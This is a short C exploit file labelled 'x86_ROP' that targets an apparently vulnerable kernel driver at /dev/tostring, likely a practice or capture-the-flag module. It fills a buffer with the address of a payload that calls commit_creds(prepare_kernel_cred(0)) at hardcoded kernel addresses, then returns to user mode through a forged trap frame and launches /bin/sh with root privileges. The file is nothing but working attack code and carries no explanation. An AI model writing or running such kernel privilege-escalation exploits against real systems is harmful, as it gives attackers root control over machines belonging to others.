// x86_ROP
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
struct trap_frame{
    void *eip;
    uint32_t cs;
    uint32_t eflags;
    void *esp;
    uint32_t ss;
}__attribute__((packed));
struct trap_frame tf;
void get_shell(void){
    execl("/bin/sh", "sh", NULL);
}
void init_tf_work(void){
    asm("pushl %cs;popl tf+4;"    //set cs
        "pushfl;popl tf+8;"       //set eflags
        "pushl %esp;popl tf+12;"
        "pushl %ss;popl tf+16;");
    tf.eip = &get_shell;
    tf.esp -= 1024;
}
#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xC10711F0;
void* (*commit_creds)(void*) KERNCALL = (void*) 0xC1070E80;
void payload(void){
    commit_creds(prepare_kernel_cred(0));
    asm("mov $tf,%esp;"
          "iret;");
}


int main(){
    init_tf_work();
    long long buf[0x100] = {0};
    int i = 0;
    int fd = open("/dev/tostring", O_RDWR);
    for(i = 0; i < 66; i++)
    {
        buf[i] = &payload;
        write(fd, &buf[i], 8);
    }
    read(fd, buf, 0);
    return 0;
}